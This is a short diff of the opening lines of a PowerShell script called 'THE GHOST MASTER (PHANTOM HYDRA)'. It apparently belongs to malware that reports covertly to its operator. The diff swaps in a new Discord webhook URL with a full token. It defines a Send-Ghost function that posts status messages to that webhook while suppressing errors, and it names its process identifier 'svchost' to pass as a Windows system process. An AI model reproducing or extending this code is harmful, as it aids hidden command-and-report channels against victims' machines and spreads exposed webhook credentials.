@@ -1,5 +1,5 @@
 # --- THE GHOST MASTER (VERSION 6.2 - PHANTOM HYDRA) ---
-$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
+$WEBHOOK = "https://discord.com/api/webhooks/1505276877214847067/v4AWiiLhBWwcL7P_uCjpFfBo122JWqI6_54pYtphp86YRt_ABvMSJOzPxj0vkqlEMte5"
 function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }
 
 $ID = "svchost"
